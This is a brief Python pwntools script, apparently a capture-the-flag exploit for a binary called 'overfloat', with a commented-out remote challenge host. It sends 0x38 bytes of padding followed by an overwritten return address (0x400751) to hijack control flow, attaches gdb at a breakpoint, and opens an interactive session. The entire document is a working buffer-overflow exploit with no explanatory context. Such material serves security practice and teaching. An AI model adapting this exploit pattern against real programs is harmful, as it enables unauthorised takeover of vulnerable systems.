# coding:utf-8
from pwn import *
context.log_level = 'debug'
# sh = remote("114.67.246.176",12159)
sh = process("./overfloat")
payload = 'a' * 0x38 
payload += "\x51\x07\x40\x00\x00\x00\x00\x00"
gdb.attach(sh,"b *0x40074F")
pause()
sh.send(payload)
sh.interactive() 